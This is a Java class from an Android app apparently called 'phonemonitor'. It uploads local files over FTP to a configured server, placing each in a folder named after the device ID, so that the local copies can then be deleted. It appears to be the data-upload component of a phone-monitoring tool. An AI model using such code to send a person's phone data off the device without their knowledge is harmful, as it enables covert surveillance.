package com.monitor.phone.s0ft.phonemonitor;


import android.content.Context;
import android.util.Log;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;


class FileUploader {


    private Context _context;
    private String _deviceUID;


    FileUploader(Context context) {
        this._context = context;
        this._deviceUID = HelperMethods.getDeviceNUID(this._context);
    }

    boolean UploadFile(File file) {
        boolean retval = false;
        if (!HelperMethods.isInternetAvailable(this._context)) return false;
        try {
            FTPClient ftpClient = new FTPClient();
            try {
                ftpClient.connect(AppSettings.getFtpServer(), AppSettings.getFtpPort());
                ftpClient.login(AppSettings.getFtpUsername(), AppSettings.getFtpPassword());
                ftpClient.enterLocalPassiveMode();
                ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
                if (!ftpClient.changeWorkingDirectory("/" + this._deviceUID))//if directory doesn't exist, create one
                    ftpClient.makeDirectory("/" + this._deviceUID);
                ftpClient.changeWorkingDirectory("/" + this._deviceUID);//change remote working directory
                if (ftpClient.listFiles(file.getName()).length == 0) {//if remote file doesn't already exist
                    FileInputStream fileInputStream = new FileInputStream(file);
                    retval = ftpClient.storeFile(file.getName(), fileInputStream);
                    fileInputStream.close();
                } else {//if remote file exists already
                    retval = true;//setting to true will allow deletion of local file
                }

            } catch (IOException ioex) {
                Log.w(AppSettings.getTAG(), "IOException at FileUploader.UploadFile() while uploading file.\n" + ioex.getMessage());
            } finally {
                if (ftpClient.isConnected()) {
                    try {
                        ftpClient.logout();
                        ftpClient.disconnect();
                    } catch (IOException ioex) {
                        Log.w(AppSettings.getTAG(), "IOException at FileUploader.UploadFile() while logging out.\n" + ioex.getMessage());
                    }
                }
            }
        } catch (SecurityException secx) {//for if no internet permission
            Log.w(AppSettings.getTAG(), "SecurityException atFIleUploader.UploadFile()\n" + secx.getMessage());
        }


        return retval;
    }


}
